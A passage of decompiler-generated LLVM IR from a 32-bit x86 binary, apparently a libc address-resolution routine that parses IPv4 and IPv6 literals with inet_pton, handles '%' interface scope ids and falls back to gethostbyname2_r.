  %v1_805e1ea = inttoptr i32 %v0_805e1ea to i8*
  %v2_805e1ea = load i8, i8* %v1_805e1ea, align 1
  %v3_805e1ea = sext i8 %v2_805e1ea to i32
  store i32 %v3_805e1ea, i32* %edx.global-to-local, align 4
  store i32 %v8_805e1de, i32* %eax.global-to-local, align 4
  %v2_805e1f0 = add i32 %v8_805e1de, 4
  %v3_805e1f0 = inttoptr i32 %v2_805e1f0 to i32*
  store i32 %v3_805e1ea, i32* %v3_805e1f0, align 4
  %v0_805e1f3 = load i32, i32* @ebx, align 4
  %v1_805e1f3 = add i32 %v0_805e1f3, 2
  %v2_805e1f3 = inttoptr i32 %v1_805e1f3 to i8*
  %v3_805e1f3 = load i8, i8* %v2_805e1f3, align 1
  %v4_805e1f3 = and i8 %v3_805e1f3, 2
  %v5_805e1f3 = icmp eq i8 %v4_805e1f3, 0
  %v3_805e1f7 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e1f7, i32* %edx.global-to-local, align 4
  br i1 %v5_805e1f3, label %dec_label_pc_805e204, label %dec_label_pc_805e1fc

dec_label_pc_805e1fc:                             ; preds = %dec_label_pc_805e1d7
  store i32 %arg3, i32* @ecx, align 4
  %v3_805e1ff = load i32, i32* %v2_805e02e, align 4
  br label %dec_label_pc_805e208

dec_label_pc_805e204:                             ; preds = %dec_label_pc_805e1d7
  %v1_805e204 = add i32 %v0_805e1f3, 1
  %v2_805e204 = inttoptr i32 %v1_805e204 to i8*
  %v3_805e204 = load i8, i8* %v2_805e204, align 1
  %v4_805e204 = sext i8 %v3_805e204 to i32
  br label %dec_label_pc_805e208

dec_label_pc_805e208:                             ; preds = %dec_label_pc_805e1fc, %dec_label_pc_805e204
  %storemerge14 = phi i32 [ %v3_805e1ff, %dec_label_pc_805e1fc ], [ %v4_805e204, %dec_label_pc_805e204 ]
  %v2_805e208 = add i32 %v3_805e1f7, 8
  %v3_805e208 = inttoptr i32 %v2_805e208 to i32*
  store i32 %storemerge14, i32* %v3_805e208, align 4
  %v3_805e20b = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e20b, i32* %eax.global-to-local, align 4
  %v1_805e20e = add i32 %v3_805e20b, 12
  %v2_805e20e = inttoptr i32 %v1_805e20e to i32*
  store i32 0, i32* %v2_805e20e, align 4
  br label %dec_label_pc_805e250

dec_label_pc_805e217:                             ; preds = %dec_label_pc_805e1d3
  %v1_805e217 = add i32 %v0_805e1ea, 7
  store i32 %v1_805e217, i32* @ecx, align 4
  %v8_805e226 = ptrtoint i32* %stack_var_-192 to i32
  %storemerge15193 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %storemerge15193, i32* @ebx, align 4
  %v1_805e24a194 = add i32 %v0_805e1ea, 10
  %v2_805e24a195 = inttoptr i32 %v1_805e24a194 to i8*
  %v3_805e24a196 = load i8, i8* %v2_805e24a195, align 1
  %v4_805e24a197 = icmp eq i8 %v3_805e24a196, 0
  %v1_805e24e199 = icmp eq i1 %v4_805e24a197, false
  br i1 %v1_805e24e199, label %dec_label_pc_805e21f, label %dec_label_pc_805e250

dec_label_pc_805e21f:                             ; preds = %dec_label_pc_805e217, %dec_label_pc_805e21f
  %storemerge15.in201 = phi i32* [ %stack_var_-192, %dec_label_pc_805e21f ], [ %stack_var_-20, %dec_label_pc_805e217 ]
  %v0_805e239200 = phi i32 [ %v1_805e239, %dec_label_pc_805e21f ], [ %v1_805e217, %dec_label_pc_805e217 ]
  store i32 %v8_805e226, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_805e22f = inttoptr i32 %v0_805e239200 to i8*
  %v2_805e22f = load i8, i8* %v1_805e22f, align 1
  %v3_805e22f = sext i8 %v2_805e22f to i32
  store i32 %v3_805e22f, i32* %edx.global-to-local, align 4
  %v1_805e235 = add i32 %v0_805e239200, 1
  %v2_805e235 = inttoptr i32 %v1_805e235 to i8*
  %v3_805e235 = load i8, i8* %v2_805e235, align 1
  %v4_805e235 = sext i8 %v3_805e235 to i32
  store i32 %v4_805e235, i32* %edx.global-to-local, align 4
  %v1_805e239 = add i32 %v0_805e239200, 7
  store i32 %v1_805e239, i32* @ecx, align 4
  store i32 %v8_805e226, i32* %storemerge15.in201, align 4
  store i32 %v8_805e226, i32* @ebx, align 4
  %v1_805e24a = add i32 %v0_805e239200, 10
  %v2_805e24a = inttoptr i32 %v1_805e24a to i8*
  %v3_805e24a = load i8, i8* %v2_805e24a, align 1
  %v4_805e24a = icmp eq i8 %v3_805e24a, 0
  %v1_805e24e = icmp eq i1 %v4_805e24a, false
  br i1 %v1_805e24e, label %dec_label_pc_805e21f, label %dec_label_pc_805e250

dec_label_pc_805e250:                             ; preds = %dec_label_pc_805e217, %dec_label_pc_805e21f, %dec_label_pc_805e16f, %dec_label_pc_805e0c1, %dec_label_pc_805e208, %dec_label_pc_805e1b1
  %v3_805e250 = load i8*, i8** %stack_var_4, align 4
  %v5_805e250 = icmp eq i8* %v3_805e250, null
  %v12_805e5eb = ptrtoint i32* %stack_var_-252 to i32
  %v2_805e5ee = ptrtoint i32* %stack_var_-237 to i32
  store i32 %v2_805e5ee, i32* %eax.global-to-local, align 4
  br i1 %v5_805e250, label %dec_label_pc_805e5eb, label %dec_label_pc_805e25a

dec_label_pc_805e25a:                             ; preds = %dec_label_pc_805e250
  %v8_805e261 = ptrtoint i32* %stack_var_-240 to i32
  store i32 %v8_805e261, i32* %stack_var_-24, align 4
  %v1_805e271 = add i32 %v8_805e261, 24
  %v2_805e271 = inttoptr i32 %v1_805e271 to i32*
  store i32 0, i32* %v2_805e271, align 4
  %v3_805e278 = load i32, i32* %stack_var_-24, align 4
  %v1_805e27b = inttoptr i32 %v3_805e278 to i32*
  store i32 0, i32* %v1_805e27b, align 4
  %v3_805e281 = load i32, i32* %stack_var_-24, align 4
  %v0_805e284 = load i32, i32* @esi, align 4
  %v1_805e285 = add i32 %v3_805e281, 8
  store i32 %v1_805e285, i32* %eax.global-to-local, align 4
  %v3_805e289 = load i8*, i8** %stack_var_4, align 4
  %v4_805e289 = ptrtoint i8* %v3_805e289 to i32
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-268, align 4
  %v5_805e28e = call i32 @inet_pton(i32 2, i8* %v3_805e289, i32 %v1_805e285)
  store i32 %v5_805e28e, i32* %eax.global-to-local, align 4
  %tmp153 = icmp slt i32 %v5_805e28e, 1
  br i1 %tmp153, label %dec_label_pc_805e2c0, label %dec_label_pc_805e29a

dec_label_pc_805e29a:                             ; preds = %dec_label_pc_805e25a
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805e29d = load i32, i32* %v2_805dfee, align 4
  store i32 %v3_805e29d, i32* %eax.global-to-local, align 4
  %v1_805e2a0 = icmp eq i32 %v3_805e29d, 0
  br i1 %v1_805e2a0, label %dec_label_pc_805e2b6, label %dec_label_pc_805e2a4

dec_label_pc_805e2a4:                             ; preds = %dec_label_pc_805e29a
  %v9_805e2a4 = icmp eq i32 %v3_805e29d, 2
  br i1 %v9_805e2a4, label %dec_label_pc_805e2b6, label %dec_label_pc_805e2a9

dec_label_pc_805e2a9:                             ; preds = %dec_label_pc_805e2a4
  %v4_805e2a9 = icmp eq i32 %stack_var_-160.0, 0
  br i1 %v4_805e2a9, label %dec_label_pc_805e937, label %dec_label_pc_805e2b6

dec_label_pc_805e2b6:                             ; preds = %dec_label_pc_805e2a9, %dec_label_pc_805e2a4, %dec_label_pc_805e29a
  %v3_805e2b6 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e2b6, i32* %eax.global-to-local, align 4
  %v1_805e2b9 = add i32 %v3_805e2b6, 4
  %v2_805e2b9 = inttoptr i32 %v1_805e2b9 to i32*
  store i32 2, i32* %v2_805e2b9, align 4
  br label %dec_label_pc_805e2c0

dec_label_pc_805e2c0:                             ; preds = %dec_label_pc_805e25a, %dec_label_pc_805e2b6
  %v3_805e2c0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e2c0, i32* %eax.global-to-local, align 4
  %v1_805e2c3 = add i32 %v3_805e2c0, 4
  %v2_805e2c3 = inttoptr i32 %v1_805e2c3 to i32*
  %v3_805e2c3 = load i32, i32* %v2_805e2c3, align 4
  %v4_805e2c3 = icmp eq i32 %v3_805e2c3, 0
  %v1_805e2c7 = icmp eq i1 %v4_805e2c3, false
  br i1 %v1_805e2c7, label %dec_label_pc_805e3b0, label %dec_label_pc_805e2cd

dec_label_pc_805e2cd:                             ; preds = %dec_label_pc_805e2c0
  %tmp154 = bitcast i8** %stack_var_4 to i32*
  %v3_805e2d07 = load i32, i32* %tmp154, align 4
  %tmp155 = bitcast i8** %stack_var_-268 to i32*
  store i32 %v3_805e2d07, i32* %tmp155, align 4
  %v0_805e2d3.cast = inttoptr i32 %v3_805e2d07 to i8*
  %v3_805e2d3 = call i32 @strlen(i8* %v0_805e2d3.cast)
  %v1_805e2db = add i32 %v3_805e2d3, 1
  store i32 %v1_805e2db, i32* %edx.global-to-local, align 4
  %v1_805e2de = add i32 %v3_805e2d3, 31
  %v1_805e2e1 = and i32 %v1_805e2de, -16
  %v2_805e2e4 = sub i32 %v12_805e5eb, %v1_805e2e1
  %v1_805e2e6 = add i32 %v2_805e2e4, 15
  store i32 %v1_805e2e6, i32* %eax.global-to-local, align 4
  %v0_805e2ea = load i32, i32* @ebx, align 4
  %v2_805e2ea = add i32 %v2_805e2e4, -4
  %v3_805e2ea = inttoptr i32 %v2_805e2ea to i32*
  store i32 %v0_805e2ea, i32* %v3_805e2ea, align 4
  %v0_805e2eb = load i32, i32* %eax.global-to-local, align 4
  %v1_805e2eb = and i32 %v0_805e2eb, -16
  store i32 %v1_805e2eb, i32* %eax.global-to-local, align 4
  %v0_805e2ee = load i32, i32* %edx.global-to-local, align 4
  %v2_805e2ee = add i32 %v2_805e2e4, -8
  %v3_805e2ee = inttoptr i32 %v2_805e2ee to i32*
  store i32 %v0_805e2ee, i32* %v3_805e2ee, align 4
  %v3_805e2ef = load i8*, i8** %stack_var_4, align 4
  %v4_805e2ef = ptrtoint i8* %v3_805e2ef to i32
  %v6_805e2ef = add i32 %v2_805e2e4, -12
  %v7_805e2ef = inttoptr i32 %v6_805e2ef to i32*
  store i32 %v4_805e2ef, i32* %v7_805e2ef, align 4
  %v0_805e2f2 = load i32, i32* %eax.global-to-local, align 4
  %v2_805e2f2 = add i32 %v2_805e2e4, -16
  %v3_805e2f2 = inttoptr i32 %v2_805e2f2 to i32*
  store i32 %v0_805e2f2, i32* %v3_805e2f2, align 4
  %v0_805e2f3 = load i8*, i8** %stack_var_-268, align 4
  %tmp156 = bitcast i8* %v0_805e2f3 to i16*
  %v5_805e2f3 = call i32 @memcpy(i16* %tmp156, i32 %v4_805e289, i32 %v1_805e285)
  store i32 %v5_805e2f3, i32* %eax.global-to-local, align 4
  %v0_805e2f8 = load i32, i32* @esp, align 4
  %v1_805e2f8 = inttoptr i32 %v0_805e2f8 to i32*
  %v2_805e2f8 = load i32, i32* %v1_805e2f8, align 4
  store i32 %v2_805e2f8, i32* %edx.global-to-local, align 4
  %v3_805e2f8 = add i32 %v0_805e2f8, 4
  %v1_805e2f9 = inttoptr i32 %v3_805e2f8 to i32*
  %v2_805e2f9 = load i32, i32* %v1_805e2f9, align 4
  store i32 %v2_805e2f9, i32* @ecx, align 4
  store i32 37, i32* %v1_805e2f9, align 4
  store i32 %v5_805e2f3, i32* @ebx, align 4
  store i32 %v5_805e2f3, i32* %v1_805e2f8, align 4
  %v0_805e2ff = load i8*, i8** %stack_var_-268, align 4
  %v4_805e2ff = call i32 @__GI_strchr(i8* %v0_805e2ff, i32 %v4_805e289)
  store i32 %v4_805e2ff, i32* %eax.global-to-local, align 4
  %v0_805e304 = load i32, i32* @esp, align 4
  %v1_805e304 = add i32 %v0_805e304, 16
  %v2_805e307 = icmp eq i32 %v4_805e2ff, 0
  store i32 %v4_805e2ff, i32* @esi, align 4
  br i1 %v2_805e307, label %dec_label_pc_805e310, label %dec_label_pc_805e30d

dec_label_pc_805e30d:                             ; preds = %dec_label_pc_805e2cd
  %v5_805e2ff = inttoptr i32 %v4_805e2ff to i8*
  store i8 0, i8* %v5_805e2ff, align 1
  %v2_805e310.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805e310

dec_label_pc_805e310:                             ; preds = %dec_label_pc_805e2cd, %dec_label_pc_805e30d
  %v2_805e310 = phi i32 [ %v1_805e304, %dec_label_pc_805e2cd ], [ %v2_805e310.pre, %dec_label_pc_805e30d ]
  %v3_805e310 = add i32 %v2_805e310, -4
  %v4_805e310 = inttoptr i32 %v3_805e310 to i32*
  store i32 %v4_805e2ff, i32* %v4_805e310, align 4
  %v3_805e311 = load i32, i32* %stack_var_-24, align 4
  %v1_805e314 = add i32 %v3_805e311, 8
  store i32 %v1_805e314, i32* %eax.global-to-local, align 4
  %v2_805e317 = add i32 %v2_805e310, -8
  %v3_805e317 = inttoptr i32 %v2_805e317 to i32*
  store i32 %v1_805e314, i32* %v3_805e317, align 4
  %v0_805e318 = load i32, i32* @ebx, align 4
  %v2_805e318 = add i32 %v2_805e310, -12
  %v3_805e318 = inttoptr i32 %v2_805e318 to i32*
  store i32 %v0_805e318, i32* %v3_805e318, align 4
  %v1_805e319 = add i32 %v2_805e310, -16
  %v2_805e319 = inttoptr i32 %v1_805e319 to i32*
  store i32 10, i32* %v2_805e319, align 4
  %v0_805e31b = load i8*, i8** %stack_var_-268, align 4
  %v1_805e31b = ptrtoint i8* %v0_805e31b to i32
  %v5_805e31b = call i32 @inet_pton(i32 %v1_805e31b, i8* %v3_805e289, i32 %v1_805e285)
  store i32 %v5_805e31b, i32* %eax.global-to-local, align 4
  %tmp157 = icmp slt i32 %v5_805e31b, 1
  br i1 %tmp157, label %dec_label_pc_805e3b0, label %dec_label_pc_805e32b

dec_label_pc_805e32b:                             ; preds = %dec_label_pc_805e310
  store i32 %arg3, i32* @ecx, align 4
  %v3_805e32e = load i32, i32* %v2_805dfee, align 4
  store i32 %v3_805e32e, i32* %eax.global-to-local, align 4
  %v1_805e331 = icmp eq i32 %v3_805e32e, 0
  br i1 %v1_805e331, label %dec_label_pc_805e33e, label %dec_label_pc_805e335

dec_label_pc_805e335:                             ; preds = %dec_label_pc_805e32b
  %v9_805e335 = icmp eq i32 %v3_805e32e, 10
  %v1_805e338 = icmp eq i1 %v9_805e335, false
  br i1 %v1_805e338, label %dec_label_pc_805e937, label %dec_label_pc_805e33e

dec_label_pc_805e33e:                             ; preds = %dec_label_pc_805e335, %dec_label_pc_805e32b
  %v3_805e33e = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e33e, i32* %eax.global-to-local, align 4
  %v1_805e343 = add i32 %v3_805e33e, 4
  %v2_805e343 = inttoptr i32 %v1_805e343 to i32*
  store i32 10, i32* %v2_805e343, align 4
  br i1 %v2_805e307, label %dec_label_pc_805e3b0, label %dec_label_pc_805e34c

dec_label_pc_805e34c:                             ; preds = %dec_label_pc_805e33e
  %v3_805e34c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e34c, i32* @ebx, align 4
  %v1_805e34f = add i32 %v3_805e34c, 8
  %v2_805e34f = inttoptr i32 %v1_805e34f to i32*
  %v3_805e34f = load i32, i32* %v2_805e34f, align 4
  %v1_805e352 = and i32 %v3_805e34f, 49407
  store i32 %v1_805e352, i32* %eax.global-to-local, align 4
  %v9_805e357 = icmp eq i32 %v1_805e352, 33022
  br i1 %v9_805e357, label %dec_label_pc_805e370, label %dec_label_pc_805e35e

dec_label_pc_805e35e:                             ; preds = %dec_label_pc_805e34c
  %v2_805e35e = inttoptr i32 %v1_805e34f to i8*
  %v3_805e35e = load i8, i8* %v2_805e35e, align 1
  %v13_805e35e = icmp eq i8 %v3_805e35e, -1
  %v1_805e362 = icmp eq i1 %v13_805e35e, false
  br i1 %v1_805e362, label %dec_label_pc_805e38b, label %dec_label_pc_805e364

dec_label_pc_805e364:                             ; preds = %dec_label_pc_805e35e
  %v1_805e364 = add i32 %v3_805e34c, 9
  %v2_805e364 = inttoptr i32 %v1_805e364 to i8*
  %v3_805e364 = load i8, i8* %v2_805e364, align 1
  %tmp = urem i8 %v3_805e364, 16
  %v1_805e368 = zext i8 %tmp to i32
  store i32 %v1_805e368, i32* %eax.global-to-local, align 4
  %v9_805e36b = icmp eq i8 %tmp, 2
  %v1_805e36e = icmp eq i1 %v9_805e36b, false
  br i1 %v1_805e36e, label %dec_label_pc_805e38b, label %dec_label_pc_805e370

dec_label_pc_805e370:                             ; preds = %dec_label_pc_805e364, %dec_label_pc_805e34c
  %v0_805e370 = load i32, i32* @esp, align 4
  %v1_805e373 = add i32 %v4_805e2ff, 1
  store i32 %v1_805e373, i32* %eax.global-to-local, align 4
  %v2_805e376 = add i32 %v0_805e370, -16
  %v3_805e376 = inttoptr i32 %v2_805e376 to i32*
  store i32 %v1_805e373, i32* %v3_805e376, align 4
  %v0_805e377 = call i32 @__GI_if_nametoindex()
  %v1_805e37f = load i32, i32* @ebx, align 4
  %v2_805e37f = add i32 %v1_805e37f, 24
  %v3_805e37f = inttoptr i32 %v2_805e37f to i32*
  store i32 %v0_805e377, i32* %v3_805e37f, align 4
  %v3_805e382 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e382, i32* %eax.global-to-local, align 4
  %v1_805e385 = add i32 %v3_805e382, 24
  %v2_805e385 = inttoptr i32 %v1_805e385 to i32*
  %v3_805e385 = load i32, i32* %v2_805e385, align 4
  %v4_805e385 = icmp eq i32 %v3_805e385, 0
  %v1_805e389 = icmp eq i1 %v4_805e385, false
  br i1 %v1_805e389, label %dec_label_pc_805e3b0, label %dec_label_pc_805e38b

dec_label_pc_805e38b:                             ; preds = %dec_label_pc_805e370, %dec_label_pc_805e364, %dec_label_pc_805e35e
  %v0_805e38b = phi i32 [ %v3_805e382, %dec_label_pc_805e370 ], [ %v1_805e368, %dec_label_pc_805e364 ], [ %v1_805e352, %dec_label_pc_805e35e ]
  %v1_805e38b = load i32, i32* @esp, align 4
  %v2_805e38b = add i32 %v1_805e38b, -4
  %v3_805e38b = inttoptr i32 %v2_805e38b to i32*
  store i32 %v0_805e38b, i32* %v3_805e38b, align 4
  %v3_805e38c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e38c, i32* @ebx, align 4
  %v1_805e38f = add i32 %v1_805e38b, -8
  %v2_805e38f = inttoptr i32 %v1_805e38f to i32*
  store i32 10, i32* %v2_805e38f, align 4
  %v2_805e391 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805e394 = add i32 %v1_805e38b, -12
  %v3_805e394 = inttoptr i32 %v2_805e394 to i32*
  store i32 %v2_805e391, i32* %v3_805e394, align 4
  %v1_805e395 = add i32 %v4_805e2ff, 1
  store i32 %v1_805e395, i32* %eax.global-to-local, align 4
  %v2_805e398 = add i32 %v1_805e38b, -16
  %v3_805e398 = inttoptr i32 %v2_805e398 to i32*
  store i32 %v1_805e395, i32* %v3_805e398, align 4
  %v0_805e399 = load i8*, i8** %stack_var_-268, align 4
  %v1_805e399 = ptrtoint i8* %v0_805e399 to i32
  %v5_805e399 = call i32 @strtoul(i32 %v1_805e399, i32 %v4_805e289, i32 %v1_805e285, i32 %v0_805e284)
  %v1_805e3a1 = load i32, i32* @ebx, align 4
  %v2_805e3a1 = add i32 %v1_805e3a1, 24
  %v3_805e3a1 = inttoptr i32 %v2_805e3a1 to i32*
  store i32 %v5_805e399, i32* %v3_805e3a1, align 4
  %v3_805e3a4 = load i8*, i8** %stack_var_-32, align 4
  %v4_805e3a4 = ptrtoint i8* %v3_805e3a4 to i32
  store i32 %v4_805e3a4, i32* %eax.global-to-local, align 4
  %v2_805e3a7 = load i8, i8* %v3_805e3a4, align 1
  %v3_805e3a7 = icmp eq i8 %v2_805e3a7, 0
  %v1_805e3aa = icmp eq i1 %v3_805e3a7, false
  br i1 %v1_805e3aa, label %dec_label_pc_805e93e, label %dec_label_pc_805e3b0

dec_label_pc_805e3b0:                             ; preds = %dec_label_pc_805e38b, %dec_label_pc_805e370, %dec_label_pc_805e33e, %dec_label_pc_805e310, %dec_label_pc_805e2c0
  %v3_805e3b0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805e3b0, i32* %eax.global-to-local, align 4
  %v1_805e3b3 = add i32 %v3_805e3b0, 4
  %v2_805e3b3 = inttoptr i32 %v1_805e3b3 to i32*
  %v3_805e3b3 = load i32, i32* %v2_805e3b3, align 4
  %v4_805e3b3 = icmp eq i32 %v3_805e3b3, 0
  %v1_805e3b7 = icmp eq i1 %v4_805e3b3, false
  br i1 %v1_805e3b7, label %dec_label_pc_805e5d9, label %dec_label_pc_805e3bd

dec_label_pc_805e3bd:                             ; preds = %dec_label_pc_805e3b0
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805e3c0 = load i8, i8* %tmp116, align 1
  %v3_805e3c0 = and i8 %v2_805e3c0, 4
  %v4_805e3c0 = icmp eq i8 %v3_805e3c0, 0
  %v1_805e3c3 = icmp eq i1 %v4_805e3c0, false
  br i1 %v1_805e3c3, label %dec_label_pc_805e5d9, label %dec_label_pc_805e3c9

dec_label_pc_805e3c9:                             ; preds = %dec_label_pc_805e3bd
  %v3_805e3c9 = load i32, i32* %v2_805dfee, align 4
  store i32 %v3_805e3c9, i32* %eax.global-to-local, align 4
  %v1_805e3cc = icmp eq i32 %v3_805e3c9, 0
  br i1 %v1_805e3cc, label %dec_label_pc_805e3dd, label %dec_label_pc_805e3d0

dec_label_pc_805e3d0:                             ; preds = %dec_label_pc_805e3c9
  %v9_805e3d0 = icmp eq i32 %v3_805e3c9, 10
  br i1 %v9_805e3d0, label %dec_label_pc_805e3dd, label %dec_label_pc_805e3d5

dec_label_pc_805e3d5:                             ; preds = %dec_label_pc_805e3d0
  %v2_805e3d5 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805e3d5, i32* @edi, align 4
  br label %dec_label_pc_805e4b5

dec_label_pc_805e3dd:                             ; preds = %dec_label_pc_805e3d0, %dec_label_pc_805e3c9
  store i32 512, i32* %ebx.global-to-local, align 4
  %v2_805e3f4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_805e3f8 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805e3fe = ptrtoint i32* %stack_var_-68 to i32
  %v0_805e3ea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805e3e2

dec_label_pc_805e3e2:                             ; preds = %dec_label_pc_805e414.dec_label_pc_805e3e2_crit_edge, %dec_label_pc_805e3dd
  %v0_805e3ea = phi i32 [ %v1_805e40c, %dec_label_pc_805e414.dec_label_pc_805e3e2_crit_edge ], [ %v0_805e3ea.pre, %dec_label_pc_805e3dd ]
  %v0_805e3e2 = phi i32 [ %v0_805e3e2.pre, %dec_label_pc_805e414.dec_label_pc_805e3e2_crit_edge ], [ 512, %dec_label_pc_805e3dd ]
  %v2_805e3e2 = mul i32 %v0_805e3e2, 2
  store i32 %v2_805e3e2, i32* @ebx, align 4
  %v1_805e3e4 = add i32 %v2_805e3e2, 30
  %v1_805e3e7 = and i32 %v1_805e3e4, -16
  %v2_805e3ea = sub i32 %v0_805e3ea, %v1_805e3e7
  %v1_805e3ec = add i32 %v2_805e3ea, 15
  store i32 %v1_805e3ec, i32* %edx.global-to-local, align 4
  %v2_805e3f0 = add i32 %v2_805e3ea, -4
  %v3_805e3f0 = inttoptr i32 %v2_805e3f0 to i32*
  store i32 %v1_805e3e7, i32* %v3_805e3f0, align 4
  %v0_805e3f1 = load i32, i32* %edx.global-to-local, align 4
  %v1_805e3f1 = and i32 %v0_805e3f1, -16
  store i32 %v1_805e3f1, i32* %edx.global-to-local, align 4
  %v2_805e3f7 = add i32 %v2_805e3ea, -8
  %v3_805e3f7 = inttoptr i32 %v2_805e3f7 to i32*
  store i32 %v2_805e3f4, i32* %v3_805e3f7, align 4
  %v2_805e3fb = add i32 %v2_805e3ea, -12
  %v3_805e3fb = inttoptr i32 %v2_805e3fb to i32*
  store i32 %v2_805e3f8, i32* %v3_805e3fb, align 4
  %v0_805e3fc = load i32, i32* @ebx, align 4
  %v2_805e3fc = add i32 %v2_805e3ea, -16
  %v3_805e3fc = inttoptr i32 %v2_805e3fc to i32*
  store i32 %v0_805e3fc, i32* %v3_805e3fc, align 4
  %v0_805e3fd = load i32, i32* %edx.global-to-local, align 4
  %v2_805e3fd = add i32 %v2_805e3ea, -20
  %v3_805e3fd = inttoptr i32 %v2_805e3fd to i32*
  store i32 %v0_805e3fd, i32* %v3_805e3fd, align 4
  store i32 %v2_805e3fe, i32* %eax.global-to-local, align 4
  %v2_805e401 = add i32 %v2_805e3ea, -24
  %v3_805e401 = inttoptr i32 %v2_805e401 to i32*
  store i32 %v2_805e3fe, i32* %v3_805e401, align 4
  %v1_805e402 = add i32 %v2_805e3ea, -28
  %v2_805e402 = inttoptr i32 %v1_805e402 to i32*
  store i32 10, i32* %v2_805e402, align 4
  %v3_805e404 = load i8*, i8** %stack_var_4, align 4
  %v4_805e404 = ptrtoint i8* %v3_805e404 to i32
  %v6_805e404 = add i32 %v2_805e3ea, -32
  %v7_805e404 = inttoptr i32 %v6_805e404 to i32*
  store i32 %v4_805e404, i32* %v7_805e404, align 4
  %v0_805e407 = call i32 @gethostbyname2_r()
  store i32 %v0_805e407, i32* %eax.global-to-local, align 4
  %v0_805e40c = load i32, i32* @esp, align 4
  %v1_805e40c = add i32 %v0_805e40c, 32
  %v9_805e40f = icmp eq i32 %v0_805e407, 34
  %v1_805e412 = icmp eq i1 %v9_805e40f, false
  br i1 %v1_805e412, label %dec_label_pc_805e41c, label %dec_label_pc_805e414

dec_label_pc_805e414:                             ; preds = %dec_label_pc_805e3e2
  %v3_805e414 = load i32, i32* %stack_var_-28, align 4
  %v13_805e414 = icmp eq i32 %v3_805e414, -1
  br i1 %v13_805e414, label %dec_label_pc_805e414.dec_label_pc_805e3e2_crit_edge, label %dec_label_pc_805e420

dec_label_pc_805e414.dec_label_pc_805e3e2_crit_edge: ; preds = %dec_label_pc_805e414
  %v0_805e3e2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805e3e2

dec_label_pc_805e41c:                             ; preds = %dec_label_pc_805e3e2
  %v1_805e41c = icmp eq i32 %v0_805e407, 0
  br i1 %v1_805e41c, label %dec_label_pc_805e449, label %dec_label_pc_805e41c.dec_label_pc_805e420_crit_edge

dec_label_pc_805e41c.dec_label_pc_805e420_crit_edge: ; preds = %dec_label_pc_805e41c
  %v3_805e420.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805e420

dec_label_pc_805e420:                             ; preds = %dec_label_pc_805e414, %dec_label_pc_805e41c.dec_label_pc_805e420_crit_edge
  %v0_805e43f = phi i32 [ %v3_805e420.pre, %dec_label_pc_805e41c.dec_label_pc_805e420_crit_edge ], [ %v3_805e414, %dec_label_pc_805e414 ]
  store i32 %v0_805e43f, i32* %eax.global-to-local, align 4
  %v10_805e423 = icmp eq i32 %v0_805e43f, -1
  br i1 %v10_805e423, label %dec_label_pc_805e945, label %dec_label_pc_805e42c

dec_label_pc_805e42c:                             ; preds = %dec_label_pc_805e420
  %v9_805e42c = icmp eq i32 %v0_805e43f, 2
  %v2_805e42f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805e42f, i32* %edx.global-to-local, align 4
  %v1_805e432 = icmp eq i1 %v9_805e42c, false
  br i1 %v1_805e432, label %dec_label_pc_805e43d, label %dec_label_pc_805e434

dec_label_pc_805e434:                             ; preds = %dec_label_pc_805e42c
  store i32 %v2_805e42f, i32* @edi, align 4
  store i32 -3, i32* @ebx, align 4
  br label %dec_label_pc_805e4b7

dec_label_pc_805e43d:                             ; preds = %dec_label_pc_805e42c
  %v9_805e43f = icmp eq i32 %v0_805e43f, 4
  %v1_805e442 = zext i1 %v9_805e43f to i32
  store i32 %v1_805e442, i32* @ebx, align 4
  store i32 %v2_805e42f, i32* @edi, align 4
  br label %dec_label_pc_805e4b7

dec_label_pc_805e449:                             ; preds = %dec_label_pc_805e41c
  %v3_805e449 = load i8*, i8** %stack_var_-32, align 4
  %v5_805e449 = icmp eq i8* %v3_805e449, null
  %v2_805e44d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805e44d, i32* %edx.global-to-local, align 4
  %v1_805e450 = icmp eq i1 %v5_805e449, false
  store i32 %v2_805e44d, i32* @edi, align 4
  br i1 %v1_805e450, label %dec_label_pc_805e456, label %dec_label_pc_805e4b5

dec_label_pc_805e456:                             ; preds = %dec_label_pc_805e449
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805e4a2181 = ptrtoint i8* %v3_805e449 to i32
  store i32 %v4_805e4a2181, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805e4ac182 = add i32 %v4_805e4a2181, 16
  %v2_805e4ac183 = inttoptr i32 %v1_805e4ac182 to i32*
  %v3_805e4ac184 = load i32, i32* %v2_805e4ac183, align 4
  store i32 %v3_805e4ac184, i32* %eax.global-to-local, align 4
  %v3_805e4af185 = inttoptr i32 %v3_805e4ac184 to i32*
  %v4_805e4af186 = load i32, i32* %v3_805e4af185, align 4
  %v5_805e4af187 = icmp eq i32 %v4_805e4af186, 0
  %v1_805e4b3189 = icmp eq i1 %v5_805e4af187, false
  br i1 %v1_805e4b3189, label %dec_label_pc_805e45c, label %dec_label_pc_805e4b5

dec_label_pc_805e45c:                             ; preds = %dec_label_pc_805e456, %dec_label_pc_805e474
  %v0_805e4a5192 = phi i32 [ %v0_805e4a5.pre, %dec_label_pc_805e474 ], [ 0, %dec_label_pc_805e456 ]
